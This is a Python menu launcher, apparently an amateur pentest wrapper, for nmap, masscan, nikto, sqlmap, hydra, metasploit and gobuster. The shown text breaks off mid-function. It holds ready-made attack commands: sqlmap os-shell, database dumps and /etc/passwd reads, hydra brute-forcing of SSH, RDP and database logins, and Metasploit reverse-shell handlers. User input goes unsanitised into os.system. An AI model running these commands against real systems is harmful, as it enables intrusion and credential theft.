#=============================================================
# STATION 404 - This tool is make from SONICZY
#==============================================================
import os
import sys
import time
import subprocess
import shutil
import importlib
import json
from colorama import Fore, Style, init
from datetime import datetime

init(autoreset=True)
R, G, Y, B, P, W, C = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.WHITE, Fore.CYAN
RESET = Style.RESET_ALL

def clear():
    os.system("clear")

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.03)

def log_output(msg, filename="underground_log.txt"):
    """Log commands and results to file"""
    with open(filename, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

def banner():
    print(f"""{R}
 █    ██  ███▄    █ ▓█████▄ ▓█████  ██▀███    ▄████  ██▀███   ▒█████   █    ██  ███▄    █ ▓█████▄ 
 ██  ▓██▒ ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒ ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒ ██ ▀█   █ ▒██▀ ██▌
▓██  ▒██░▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓██  ▒██░▓██  ▀█ ██▒░██   █▌
▓▓█  ░██░▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  ░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓▓█  ░██░▓██▒  ▐▌██▒░▓█▄   ▌
▒▒█████▓ ▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒▒█████▓ ▒██░   ▓██░░▒████▓ 
░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░ ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒  ▒▒▓  ▒ 
░░▒░ ░ ░ ░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░░   ░ ▒░ ░ ▒  ▒ 
 ░░░ ░ ░    ░   ░ ░  ░ ░  ░    ░     ░░   ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒   ░░░ ░ ░    ░   ░ ░  ░ ░  ░ 
   ░              ░    ░       ░  ░   ░           ░    ░         ░ ░     ░              ░    ░    
                     ░                                                                     ░      {RESET}""")

def separator():
    print(f"{R}{'═'*50}{RESET}")

def menu_header(title, number=""):
    clear()
    print(f"{R}╔{'═'*48}╗{RESET}")
    print(f"{R}║{W} {title:<46} {R}║{RESET}")
    print(f"{R}╚{'═'*48}╝{RESET}\n")

def show_options(options_list):
    for opt in options_list:
        print(opt)
    print(f"{Y}  [0]{W} Back\n")

TOOLS = {
  '01':'whois','02':'theharvester','04':'sublist3r',
  '05':'dnsenum','06':'recon-ng','07':'dirsearch','08':'feroxbuster',
  '09':'arjun','10':'nmap','11':'masscan','12':'rustscan',
  '13':'nikto','14':'gobuster','15':'ffuf','16':'whatweb',
  '17':'wpscan','18':'netdiscover','19':'enum4linux','20':'nuclei',
  '21':'sqlmap','22':'xsstrike','23':'wapiti','24':'openvas',
  '25':'searchsploit','26':'wfuzz','27':'metasploit','28':'msfvenom',
  '29':'exploitdb','30':'commix','31':'sqlninja','32':'beef',
  '33':'hydra','34':'medusa','35':'crowbar','36':'responder',
  '37':'netcat','38':'socat','39':'pwncat','40':'mimikatz',
  '41':'linpeas','42':'winpeas','43':'pspy','44':'bloodhound',
  '45':'crackmapexec','46':'impacket','47':'ligolo','48':'chisel',
  '49':'proxychains','50':'anonsurf','51':'tor',
}

# Optional aliases for tools when binary name differs
TOOL_ALIASES = {
        'metasploit': ['msfconsole', 'msfvenom', 'msf'],
        'msfvenom': ['msfvenom', 'msfconsole'],
        'proxychains': ['proxychains', 'proxychains4'],
    'pwncat': ['pwncat', 'pwncat-cs'],
    'impacket': ['impacket'],
    'sublist3r': ['sublist3r', 'Sublist3r', 'sublist3r.py'],
    'feroxbuster': ['feroxbuster'],
    'arjun': ['arjun', 'arjun.py'],
    'rustscan': ['rustscan'],
    'nuclei': ['nuclei'],
    'sqlninja': ['sqlninja'],
    'beef': ['beef', 'beef-xss'],
    'crowbar': ['crowbar'],
    'pspy': ['pspy', 'pspy64', 'pspy32'],
    'bloodhound': ['bloodhound', 'bloodhound-python'],
    'crackmapexec': ['crackmapexec', 'cme'],
    'ligolo': ['ligolo', 'ligolo-server', 'ligolo-client'],
    'chisel': ['chisel'],
    'anonsurf': ['anonsurf'],
}

# Common bin directories to check if binaries are installed outside PATH
COMMON_BIN_DIRS = [
    '/usr/bin', '/usr/local/bin', '/snap/bin', os.path.expanduser('~/.local/bin'),
    '/opt/bin', '/opt', '/usr/sbin', '/sbin'
]

# Map tool names to python package names (if applicable)
TOOL_PY_PACKAGES = {
    'sublist3r': ['sublist3r'],
    'arjun': ['arjun'],
    'pspy': ['pspy'],
}

# Manual paths provided by user for tools not found on PATH
TOOL_MANUAL_PATHS = {}

def check_in_common_paths(name):
    """Check common binary directories for an executable with given name."""
    for d in COMMON_BIN_DIRS:
        try:
            p = os.path.join(d, name)
            if os.path.exists(p) and os.access(p, os.X_OK):
                return True
            # try with .py extension
            ppy = p + '.py'
            if os.path.exists(ppy) and os.access(ppy, os.X_OK):
                return True
        except Exception:
            continue
    return False

# ══════════════════════════════════════════════════════
# TOOL INSTALLATION CHECK
# ══════════════════════════════════════════════════════

def check_tool_installed(tool_name):
    """Check if a tool is installed and available in PATH.

    Uses `shutil.which` first, falls back to `command -v` and special-case
    checks (e.g., Python package import for `impacket`). Supports aliases
    defined in `TOOL_ALIASES`.
    """
    # If user supplied a manual path for this tool, check it first
    manual = TOOL_MANUAL_PATHS.get(tool_name)
    if manual:
        try:
            if os.path.exists(manual) and os.access(manual, os.X_OK):
                return True
        except Exception:
            pass

    aliases = TOOL_ALIASES.get(tool_name, [tool_name])
    for name in aliases:
        try:
            # Preferred check
            if shutil.which(name):
                return True
            # Fallback to shell command
            res = subprocess.run(f"command -v {name}", shell=True, capture_output=True, text=True)
            if res.returncode == 0 and res.stdout.strip():
                return True
        except Exception:
            continue

    # Special-case: check if impacket Python package is installed
    if tool_name == 'impacket':
        try:
            importlib.import_module('impacket')
            return True
        except Exception:
            return False

    # Check common bin directories (for local installs)
    for name in aliases:
        if check_in_common_paths(name):
            return True

    # Check known python package names for certain tools
    pkg_names = TOOL_PY_PACKAGES.get(tool_name, [])
    for pkg in pkg_names:
        try:
            importlib.import_module(pkg)
            return True
        except Exception:
            # try pip show as fallback
            try:
                res = subprocess.run(f"pip3 show {pkg}", shell=True, capture_output=True, text=True)
                if res.returncode == 0 and res.stdout.strip():
                    return True
            except Exception:
                continue

    return False

def get_uninstalled_tools():
    """Get list of tools that are not installed"""
    uninstalled = []
    for code, tool in TOOLS.items():
        if not check_tool_installed(tool):
            uninstalled.append((code, tool))
    return uninstalled

def install_tool(tool_name):
    """Install a tool using apt (for Debian/Ubuntu based systems)"""
    print(f"{Y}  Installing {tool_name}...{RESET}")
    try:
        os.system(f"sudo apt-get update && sudo apt-get install -y {tool_name}")
        print(f"{G}  [✓] {tool_name} installed successfully{RESET}")
        log_output(f"Tool installed: {tool_name}")
        return True
    except Exception as e:
        print(f"{R}  [✗] Error installing {tool_name}: {e}{RESET}")
        log_output(f"Error installing {tool_name}: {e}")
        return False

def install_multiple_tools(tool_list):
    """Install multiple tools"""
    tools_to_install = [tool for _, tool in tool_list]
    print(f"\n{Y}  Installing {len(tools_to_install)} tools...{RESET}")
    for tool in tools_to_install:
        install_tool(tool)
    print(f"\n{G}  [✓] Installation complete!{RESET}")

def show_uninstalled_tools_menu(uninstalled_tools):
    """Show menu for uninstalled tools"""
    clear()
    print(f"{R}╔{'═'*41}╗{RESET}")
    print(f"{R}║{W} MISSING TOOLS - INSTALLATION REQUIRED {R}║{RESET}")
    print(f"{R}╚{'═'*41}╝{RESET}\n")
    
    print(f"{Y}  The following tools are not installed:{RESET}\n")
    for code, tool in uninstalled_tools:
        print(f"  {R}[{code}]{W} {tool}")
    
    print(f"\n{R}{'='*52}{RESET}")
    print(f"{Y}  [1]{W} Install all missing tools")
    print(f"{Y}  [2]{W} Select specific tools to install")
    print(f"{Y}  [3]{W} Skip and continue (tools will not be available)")
    print(f"{Y}  [4]{W} Provide path for a tool (mark as installed)")
    print(f"{R}{'='*52}{RESET}\n")
    
    choice = input(f"{R}  >> {W}").strip()
    return choice

def handle_tool_selection(uninstalled_tools):
    """Let user select which tools to install"""
    clear()
    print(f"{R}╔{'═'*41}╗{RESET}")
    print(f"{R}║{W} SELECT TOOLS TO INSTALL{R}║{RESET}")
    print(f"{R}╚{'═'*41}╝{RESET}\n")
    
    print(f"{Y}  Enter tool numbers separated by comma (e.g: 01,02,04):{RESET}")
    print(f"{Y}  Available tools:{RESET}\n")
    
    for code, tool in uninstalled_tools:
        print(f"  {R}[{code}]{W} {tool}")
    
    print(f"\n{R}{'='*50}{RESET}\n")
    
    user_input = input(f"{R}  >> {W}").strip()
    selected_codes = [s.strip() for s in user_input.split(',')]
    
    selected_tools = []
    for code, tool in uninstalled_tools:
        if code in selected_codes:
            selected_tools.append((code, tool))
    
    return selected_tools


def manual_add_tool_path(uninstalled_tools):
    """Allow user to provide a path to a tool executable and validate it."""
    clear()
    print(f"{R}Provide full path to tool executable to mark it as installed{RESET}\n")
    print(f"Available missing tools:\n")
    for code, tool in uninstalled_tools:
        print(f"  {R}[{code}]{W} {tool}")
    print("\n")
    code = input(f"{R} Enter tool code (e.g. 04): {W}").strip()
    path = input(f"{R} Enter full path to executable: {W}").strip()
    # find tool name
    tname = None
    for c, t in uninstalled_tools:
        if c == code:
            tname = t
            break
    if not tname:
        print(f"{R} Invalid tool code.{RESET}")
        time.sleep(1)
        return None
    if os.path.exists(path) and os.access(path, os.X_OK):
        TOOL_MANUAL_PATHS[tname] = path
        print(f"{G}  Marked {tname} as installed via {path}{RESET}")
        log_output(f"Manual tool path set: {tname} -> {path}")
        time.sleep(1)
        return (code, tname)
    else:
        print(f"{R}  Path not valid or not executable.{RESET}")
        time.sleep(1)
        return None

def check_tools_installation():
    """Check all tools installation and handle missing ones"""
    uninstalled = get_uninstalled_tools()
    
    if not uninstalled:
        print(f"{G}  [✓] All tools are installed!{RESET}")
        time.sleep(2)
        return
    
    while True:
        choice = show_uninstalled_tools_menu(uninstalled)
        
        if choice == '1':
            install_multiple_tools(uninstalled)
            uninstalled = get_uninstalled_tools()
            if not uninstalled:
                print(f"\n{G}  [✓] All tools are now installed!{RESET}")
                time.sleep(2)
                break
        elif choice == '2':
            selected_tools = handle_tool_selection(uninstalled)
            if selected_tools:
                install_multiple_tools(selected_tools)
                uninstalled = get_uninstalled_tools()
                if not uninstalled:
                    print(f"\n{G}  [✓] All tools are now installed!{RESET}")
                    time.sleep(2)
                    break
                else:
                    print(f"\n{Y}  Some tools still need installation.{RESET}")
                    input(f"\n{W}  Press Enter to continue...{RESET}")
            else:
                print(f"\n{R}  [!] No tools selected.{RESET}")
                time.sleep(1)
        elif choice == '3':
            print(f"\n{Y}  Continuing without installing missing tools...{RESET}")
            time.sleep(2)
            break
        else:
            print(f"\n{R}  [!] Invalid option!{RESET}")
            time.sleep(1)

# ══════════════════════════════════════════════════════
# TOOL OPTION MENUS
# ══════════════════════════════════════════════════════

def get_target(prompt="Enter target (IP/domain/URL): "):
    return input(f"{Y}  {prompt}{W}").strip()

def get_multiple_inputs(prompt_dict):
    """Get multiple inputs from user"""
    results = {}
    for key, prompt in prompt_dict.items():
        results[key] = input(f"{Y}  {prompt}{W}").strip()
    return results

def run_cmd(cmd):
    # Accept either a command string or a callable that returns a command string.
    cmd_str = None
    try:
        if callable(cmd):
            res = cmd()
            if isinstance(res, str):
                cmd_str = res
            else:
                # nothing to run
                return
        else:
            cmd_str = str(cmd)

        print(f"\n{R}  [EXECUTING] {Y}{cmd_str}{RESET}\n")
        log_output(f"COMMAND: {cmd_str}")
        try:
            os.system(cmd_str)
            log_output("Command completed successfully")
        except Exception as e:
            print(f"{R}  [ERROR] {e}{RESET}")
            log_output(f"ERROR: {e}")
    finally:
        print(f"\n{R}  [DONE]{RESET}")
        input(f"\n{W}  Press Enter to continue...{RESET}")

def run_cmd_quiet(cmd):
    """Run command and capture output"""
    try:
        # Accept callables that return a command string
        if callable(cmd):
            cmd = cmd()
            if cmd is None:
                return ""
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        print(f"{R}  [ERROR] {e}{RESET}")
        return ""

def save_output(content, filename=None):
    """Save command output to file"""
    if not filename:
        filename = f"output_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        with open(filename, "w") as f:
            f.write(content)
        print(f"{G}  [✓] Output saved to: {filename}{RESET}")
        log_output(f"Output saved to: {filename}")
    except Exception as e:
        print(f"{R}  [✗] Error saving file: {e}{RESET}")

def tool_whois():
    menu_header("01. WHOIS LOOKUP")
    options = [
        f"{Y}  [1]{W} Basic whois lookup",
        f"{Y}  [2]{W} Whois with verbose output",
        f"{Y}  [3]{W} Whois specific server",
        f"{Y}  [4]{W} Whois IP address only",
        f"{Y}  [5]{W} Whois with no recursive lookup",
        f"{Y}  [6]{W} Whois domain registrar info",
        f"{Y}  [7]{W} Whois with nameserver info",
        f"{Y}  [8]{W} Save whois output to file",
        f"{Y}  [9]{W} Whois bulk domains",
        f"{Y}  [10]{W} Whois with proxy",
        f"{Y}  [11]{W} Whois with custom timeout",
        f"{Y}  [12]{W} Custom whois command",
    ]
    show_options(options)
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    
    if c == '12':
        cmd = get_target("Custom command: ")
        run_cmd(cmd)
        return
    
    t = get_target("Enter domain/IP: ")
    
    cmds = {
        '1': f"whois {t}",
        '2': f"whois -v {t}",
        '3': lambda: f"whois -h {get_target('Enter whois server: ')} {t}",
        '4': f"whois -i {t}",
        '5': f"whois -r {t}",
        '6': f"whois --format=full {t}",
        '7': f"whois -b {t}",
        '8': lambda: f"whois {t} > whois_{t.replace('/', '_')}.txt",
        '9': lambda: run_whois_bulk(t),
        '10': lambda: f"whois -h whois.iana.org {t} --proxy http://proxy:8080",
        '11': lambda: f"whois {t} --timeout 10",
    }
    
    if c in cmds:
        cmd = cmds[c]
        if callable(cmd):
            cmd()
        else:
            run_cmd(cmd)

def run_whois_bulk(target):
    """Run whois on multiple domains from file"""
    filename = get_target("Enter file with domains (one per line): ")
    try:
        with open(filename, "r") as f:
            domains = f.readlines()
        for domain in domains:
            domain = domain.strip()
            if domain:
                run_cmd(f"whois {domain} >> bulk_whois_output.txt")
    except Exception as e:
        print(f"{R}  [ERROR] {e}{RESET}")
def tool_nmap():
    menu_header("10. NMAP PORT SCANNING")
    options = [
        f"{Y}  [1]{W} Ping scan (discover hosts)",
        f"{Y}  [2]{W} SYN scan (half-open)",
        f"{Y}  [3]{W} TCP connect scan",
        f"{Y}  [4]{W} UDP scan",
        f"{Y}  [5]{W} Service version detection",
        f"{Y}  [6]{W} OS detection",
        f"{Y}  [7]{W} Aggressive scan (OS + version + scripts)",
        f"{Y}  [8]{W} Fast scan (top 100 ports)",
        f"{Y}  [9]{W} Scan all ports",
        f"{Y}  [10]{W} Scan specific port range",
        f"{Y}  [11]{W} NSE scripts scan",
        f"{Y}  [12]{W} Save output to multiple formats",
        f"{Y}  [13]{W} Scan subnet/CIDR",
        f"{Y}  [14]{W} Scan with timing templates",
        f"{Y}  [15]{W} Full comprehensive scan",
    ]
    show_options(options)
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    
    t = get_target("Enter target IP/hostname/subnet: ")
    
    cmds = {
        '1': f"nmap -sn {t}",
        '2': f"nmap -sS {t}",
        '3': f"nmap -sT {t}",
        '4': f"nmap -sU {t}",
        '5': f"nmap -sV {t}",
        '6': f"nmap -O {t}",
        '7': f"nmap -A {t}",
        '8': f"nmap -F {t}",
        '9': f"nmap -p- {t}",
        '10': lambda: f"nmap -p {get_target('Enter port range (e.g. 80,443 or 1-1000): ')} {t}",
        '11': lambda: f"nmap --script {get_target('Enter script name (e.g. default,vuln): ')} {t}",
        '12': lambda: f"nmap -A {t} -oN nmap_{t.replace('/', '_')}.txt -oX nmap_{t.replace('/', '_')}.xml -oG nmap_{t.replace('/', '_')}.gnmap",
        '13': lambda: f"nmap -sn {t}/24",
        '14': lambda: f"nmap -A {t} -T{get_target('Timing (0-5, default 3): ')}",
        '15': f"nmap -A -p- -sV -sC -O --script vuln {t} -oN nmap_comprehensive_{t.replace('/', '_')}.txt",
    }
    
    if c in cmds:
        cmd = cmds[c]
        if callable(cmd):
            cmd()
        else:
            run_cmd(cmd)

def tool_masscan():
    menu_header("11. MASSCAN - FAST PORT SCANNER")
    options = [
        f"{Y}  [1]{W} Fast scan all ports",
        f"{Y}  [2]{W} Scan specific ports",
        f"{Y}  [3]{W} UDP scan",
        f"{Y}  [4]{W} Scan with rate limit",
        f"{Y}  [5]{W} Exclude ports",
        f"{Y}  [6]{W} Save output to file",
        f"{Y}  [7]{W} JSON output format",
        f"{Y}  [8]{W} Binary output format",
        f"{Y}  [9]{W} Scan multiple IPs/ranges",
        f"{Y}  [10]{W} With custom interface",
        f"{Y}  [11]{W} Resume previous scan",
        f"{Y}  [12]{W} Ultra-fast scan",
    ]
    show_options(options)
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    
    cmds = {
        '1': lambda: f"masscan -p0-65535 {get_target('Enter IP/range: ')}",
        '2': lambda: f"masscan -p {get_target('Enter ports (e.g. 22,80,443): ')} {get_target('Enter IP/range: ')}",
        '3': lambda: f"masscan -pU:0-65535 {get_target('Enter IP/range: ')}",
        '4': lambda: f"masscan -p0-65535 --rate {get_target('Enter rate (packets/sec, e.g. 1000): ')} {get_target('Enter IP/range: ')}",
        '5': lambda: f"masscan -p0-65535 --exclude {get_target('Enter ports to exclude: ')} {get_target('Enter IP/range: ')}",
        '6': lambda: f"masscan -p0-65535 {get_target('Enter IP/range: ')} -oL masscan_output.txt",
        '7': lambda: f"masscan -p0-65535 {get_target('Enter IP/range: ')} -oJ masscan_output.json",
        '8': lambda: f"masscan -p0-65535 {get_target('Enter IP/range: ')} -oB masscan_output.bin",
        '9': lambda: f"masscan -p0-65535 {get_target('Enter IPs/ranges (comma-separated): ')}",
        '10': lambda: f"masscan -p0-65535 -i {get_target('Enter interface: ')} {get_target('Enter IP/range: ')}",
        '11': lambda: f"masscan --resume masscan_output.bin",
        '12': lambda: f"masscan -p0-65535 --rate 10000 {get_target('Enter IP/range: ')}",
    }
    
    if c in cmds:
        cmd = cmds[c]
        if callable(cmd):
            cmd()
        else:
            run_cmd(cmd)

def tool_nikto():
    menu_header("13. NIKTO WEB SCANNER")
    options = [
        f"{Y}  [1]{W} Basic web scan",
        f"{Y}  [2]{W} Scan with plugins",
        f"{Y}  [3]{W} Scan specific port",
        f"{Y}  [4]{W} SSL/TLS scan",
        f"{Y}  [5]{W} Save output to file",
        f"{Y}  [6]{W} Output as XML",
        f"{Y}  [7]{W} Output as CSV",
        f"{Y}  [8]{W} With custom user-agent",
        f"{Y}  [9]{W} With proxy",
        f"{Y}  [10]{W} With authentication",
        f"{Y}  [11]{W} Scan multiple hosts",
        f"{Y}  [12]{W} Aggressive scan",
    ]
    show_options(options)
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    
    cmds = {
        '1': lambda: f"nikto -h {get_target('Enter target URL: ')}",
        '2': lambda: f"nikto -h {get_target('Enter target URL: ')} -Plugins {get_target('Enter plugins: ')}",
        '3': lambda: f"nikto -h {get_target('Enter target URL: ')} -p {get_target('Enter port: ')}",
        '4': lambda: f"nikto -h {get_target('Enter target URL: ')} -ssl",
        '5': lambda: f"nikto -h {get_target('Enter target URL: ')} -o nikto_output.txt",
        '6': lambda: f"nikto -h {get_target('Enter target URL: ')} -o nikto_output.xml -Format xml",
        '7': lambda: f"nikto -h {get_target('Enter target URL: ')} -o nikto_output.csv -Format csv",
        '8': lambda: f"nikto -h {get_target('Enter target URL: ')} -useragent '{get_target('Enter user-agent: ')}'",
        '9': lambda: f"nikto -h {get_target('Enter target URL: ')} -useproxy {get_target('Enter proxy URL: ')}",
        '10': lambda: f"nikto -h {get_target('Enter target URL: ')} -id {get_target('Enter username:password: ')}",
        '11': lambda: f"nikto -h {get_target('Enter host list file: ')} -F hostfile",
        '12': lambda: f"nikto -h {get_target('Enter target URL: ')} -Display V",
    }
    
    if c in cmds:
        cmd = cmds[c]
        if callable(cmd):
            cmd()
        else:
            run_cmd(cmd)

def tool_sqlmap():
    menu_header("21. SQLMAP SQL INJECTION TESTER")
    options = [
        f"{Y}  [1]{W} Basic SQL injection test",
        f"{Y}  [2]{W} Test with GET parameters",
        f"{Y}  [3]{W} Test with POST data",
        f"{Y}  [4]{W} Test with cookies",
        f"{Y}  [5]{W} Test with custom headers",
        f"{Y}  [6]{W} Dump database",
        f"{Y}  [7]{W} Dump specific table",
        f"{Y}  [8]{W} OS shell access",
        f"{Y}  [9]{W} File read/write",
        f"{Y}  [10]{W} With proxy",
        f"{Y}  [11]{W} Aggressive testing",
        f"{Y}  [12]{W} Time-based blind SQLi",
        f"{Y}  [13]{W} Boolean-based blind SQLi",
        f"{Y}  [14]{W} Union-based SQLi",
        f"{Y}  [15]{W} Full database dump",
    ]
    show_options(options)
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    
    cmds = {
        '1': lambda: f"sqlmap -u {get_target('Enter target URL: ')}",
        '2': lambda: f"sqlmap -u {get_target('Enter target URL with GET params: ')} --dbs",
        '3': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --data '{get_target('Enter POST data: ')}'",
        '4': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --cookie '{get_target('Enter cookies: ')}'",
        '5': lambda: f"sqlmap -u {get_target('Enter target URL: ')} -H '{get_target('Enter header: ')}'",
        '6': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --dbs",
        '7': lambda: f"sqlmap -u {get_target('Enter target URL: ')} -D {get_target('Enter database name: ')} --tables",
        '8': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --os-shell",
        '9': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --file-read=/etc/passwd",
        '10': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --proxy=http://proxy:8080",
        '11': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --risk=3 --level=5",
        '12': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --technique=T",
        '13': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --technique=B",
        '14': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --technique=U",
        '15': lambda: f"sqlmap -u {get_target('Enter target URL: ')} --dump-all -o sqlmap_dump.txt",
    }
    
    if c in cmds:
        cmd = cmds[c]
        if callable(cmd):
            cmd()
        else:
            run_cmd(cmd)

def tool_hydra():
    menu_header("33. HYDRA - CREDENTIAL BRUTE FORCE")
    options = [
        f"{Y}  [1]{W} SSH brute force",
        f"{Y}  [2]{W} HTTP form brute force",
        f"{Y}  [3]{W} FTP brute force",
        f"{Y}  [4]{W} SMTP brute force",
        f"{Y}  [5]{W} POP3 brute force",
        f"{Y}  [6]{W} RDP brute force",
        f"{Y}  [7]{W} MySQL brute force",
        f"{Y}  [8]{W} PostgreSQL brute force",
        f"{Y}  [9]{W} Telnet brute force",
        f"{Y}  [10]{W} LDAP brute force",
        f"{Y}  [11]{W} With custom wordlists",
        f"{Y}  [12]{W} With proxy support",
        f"{Y}  [13]{W} Threaded attack",
        f"{Y}  [14]{W} Verbose output",
    ]
    show_options(options)
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    
    target = get_target("Enter target: ")
    user = get_target("Enter username/userlist: ")
    
    cmds = {
        '1': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target}",
        '2': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:user=^USER^&pass=^PASS^'",
        '3': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt ftp://{target}",
        '4': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt smtp://{target}",
        '5': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt pop3://{target}",
        '6': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt rdp://{target}",
        '7': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt mysql://{target}",
        '8': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt postgres://{target}",
        '9': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt telnet://{target}",
        '10': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt ldap://{target}",
        '11': lambda: f"hydra -l {user} -P {get_target('Enter password wordlist path: ')} ssh://{target}",
        '12': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt -x http-proxy {target}",
        '13': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt -t 16 ssh://{target}",
        '14': lambda: f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt -v ssh://{target}",
    }
    
    if c in cmds:
        cmd = cmds[c]
        if callable(cmd):
            cmd()
        else:
            run_cmd(cmd)

def tool_metasploit():
    menu_header("27. METASPLOIT FRAMEWORK")
    options = [
        f"{Y}  [1]{W} Start msfconsole interactive",
        f"{Y}  [2]{W} Search module",
        f"{Y}  [3]{W} Use module",
        f"{Y}  [4]{W} Set options",
        f"{Y}  [5]{W} Run exploit",
        f"{Y}  [6]{W} Generate payload",
        f"{Y}  [7]{W} Post exploitation modules",
        f"{Y}  [8]{W} Listener setup",
        f"{Y}  [9]{W} Database operations",
        f"{Y}  [10]{W} Handler for reverse shell",
    ]
    show_options(options)
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    
    if c == '1':
        run_cmd("msfconsole")
    elif c == '2':
        module = get_target("Enter search keyword: ")
        run_cmd(f"msfconsole -x 'search {module}'")
    elif c == '3':
        module = get_target("Enter module path: ")
        run_cmd(f"msfconsole -x 'use {module}'")
    elif c == '4':
        option = get_target("Enter option (e.g., RHOST 192.168.1.1): ")
        run_cmd(f"msfconsole -x 'set {option}'")
    elif c == '5':
        run_cmd("msfconsole -x 'exploit'")
    elif c == '6':
        payload = get_target("Enter payload: ")
        options_str = get_target("Enter options (LHOST=IP LPORT=PORT): ")
        run_cmd(f"msfconsole -x 'generate -f exe -p {payload} {options_str} -o payload.exe'")
    elif c == '7':
        run_cmd("msfconsole -x 'search post/'")
    elif c == '8':
        payload = get_target("Enter payload (e.g., windows/meterpreter/reverse_tcp): ")
        lhost = get_target("Enter LHOST: ")
        lport = get_target("Enter LPORT: ")
        run_cmd(f"msfconsole -x 'use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'")
    elif c == '9':
        run_cmd("msfconsole -x 'db_status'")
    elif c == '10':
        payload = get_target("Enter payload (e.g., windows/meterpreter/reverse_tcp): ")
        lhost = get_target("Enter LHOST: ")
        lport = get_target("Enter LPORT: ")
        run_cmd(f"msfconsole -x 'use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run'")

def tool_gobuster():
    menu_header("14. GOBUSTER - DIRECTORY BRUTE FORCE")
    options = [
        f"{Y}  [1]{W} Basic directory scan",
        f"{Y}  [2]{W} DNS subdomain brute force",
        f"{Y}  [3]{W} VHOST brute force",
        f"{Y}  [4]{W} With custom wordlist",
        f"{Y}  [5]{W} With extensions",
        f"{Y}  [6]{W} With authentication",
        f"{Y}  [7]{W} With proxy",
        f"{Y}  [8]{W} With cookies",
        f"{Y}  [9]{W} Threads control",
        f"{Y}  [10]{W} Show response status codes",
        f"{Y}  [11]{W} Recursive scan",
        f"{Y}  [12]{W} Full aggressive scan",
    ]
    show_options(options)
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    
    target = get_target("Enter target URL: ")
    
    cmds = {
        '1': f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt",
        '2': lambda: f"gobuster dns -d {get_target('Enter domain: ')} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        '3': lambda: f"gobuster vhost -u {target} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        '4': lambda: f"gobuster dir -u {target} -w {get_target('Enter wordlist path: ')}",
        '5': lambda: f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -x {get_target('Enter extensions (e.g., php,html,txt): ')}",
        '6': lambda: f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -U {get_target('Enter username: ')} -P {get_target('Enter password: ')}",
        '7': lambda: f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt --proxy {get_target('Enter proxy: ')}",
        '8': lambda: f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -b {get_target('Enter status codes to exclude: ')}",
        '9': lambda: f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t {get_target('Enter threads: ')}",
        '10': lambda: f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -s 200,204,301,302,307,401,403",
        '11': lambda: f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -r",
        '12': lambda: f"gobuster dir -u {target} -w /usr/share/wordlists/big.txt -x php,html,txt,js -t 50 -r",
    }
    
    if c in cmds:
